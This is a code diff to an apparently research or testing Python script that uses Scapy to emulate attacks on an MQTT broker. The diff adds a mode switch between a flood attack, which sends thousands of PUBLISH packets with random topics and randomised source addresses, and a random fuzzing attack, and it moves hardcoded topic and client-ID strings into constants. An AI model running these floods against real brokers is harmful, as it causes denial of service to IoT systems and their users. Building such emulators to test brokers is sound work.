@@ -17,6 +17,9 @@ ERR_MESSAGE = {
 }
 
 destination = CONST.IP_ADDRESS
+SUBSCRIBE_TOPIC = CONST.SUBSCRIBE_TOPIC
+PUBLISH_TOPIC_SUFFIX = CONST.PUBLISH_TOPIC_SUFFIX
+CLIENTID_SUFFIX = CONST.CLIENTID_SUFFIX
 source = '192.168.31.233'
 client_id = "scapy_test"
 topic = "python/shit"
@@ -1095,54 +1098,55 @@ def GEN_RANDOM_PACKAGE_PUBLISH_MAIN():
     return choose_type[0]
 
 
-def CONNECT_ATTACK_EMU_1():
+def CONNECT_ATTACK_EMU_1(mode=0):
     """
     good
+    :param mode: 0=flood 1=random/fuzzing other=flood
     :return:
     """
 
     def random_attack():
         send_scenarii(
-            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix='MQTT_'), willflag=1, willretainflag=1,
+            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix=CLIENTID_SUFFIX), willflag=1, willretainflag=1,
                                  usernameflag=1, passwordflag=1)] +
 
             [
                 GEN_RANDOM_PACKAGE_EQUAL(
                     number=GEN_RANDOM_PACKAGE_PUBLISH_MAIN(),
-                    clientId_suffix='MQTT_',
-                    topic_suffix='test/',
-                    topicName='test/#'
+                    clientId_suffix=CLIENTID_SUFFIX,
+                    topic_suffix=PUBLISH_TOPIC_SUFFIX,
+                    topicName=SUBSCRIBE_TOPIC
                 ) for _ in range(10000)
             ],
             destination)
 
     def flood_attack():
         send_scenarii(
-            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix='MQTT_'), willflag=1, willretainflag=1)] +
+            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix=CLIENTID_SUFFIX), willflag=1, willretainflag=1)] +
             [
                 PUBLISH_ONLY_TEST_0(
-                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
+                    topic=randomIP.RANDOM_NAME(suffix=PUBLISH_TOPIC_SUFFIX, randomLen=random.randint(1, 10)),
                     value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                 )
             ] * 5000
             +
             [
                 PUBLISH_ONLY_TEST_0(
-                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
+                    topic=randomIP.RANDOM_NAME(suffix=PUBLISH_TOPIC_SUFFIX, randomLen=random.randint(1, 10)),
                     value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                 )
             ] * 5000
             +
             [
                 PUBLISH_ONLY_TEST_0(
-                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
+                    topic=randomIP.RANDOM_NAME(suffix=PUBLISH_TOPIC_SUFFIX, randomLen=random.randint(1, 10)),
                     value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                 )
             ] * 5000
             +
             [
                 PUBLISH_ONLY_TEST_0(
-                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
+                    topic=randomIP.RANDOM_NAME(suffix=PUBLISH_TOPIC_SUFFIX, randomLen=random.randint(1, 10)),
                     value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                 )
             ] * 5000
@@ -1155,18 +1159,13 @@ def CONNECT_ATTACK_EMU_1():
         logging.info(
             msg=f'ATTACK ROUND {round} START!'
         )
-        temp_client_id = randomIP.RANDOM_NAME(suffix='MQTT_')
-        temp_target_ip = destination
-        temp_target_port = 1883
-        temp_src_ip = randomIP.IPV4()
-        temp_src_port = random.randint(12000, 16665)
-        topic = randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10))
-        value = randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
-
         try:
-            # flood_attack()
-            random_attack()
-
+            if mode == 0:
+                flood_attack()
+            elif mode == 1:
+                random_attack()
+            else:
+                flood_attack()
 
         except ConnectionAbortedError as cae:
             print(f'Error = <{cae}>')
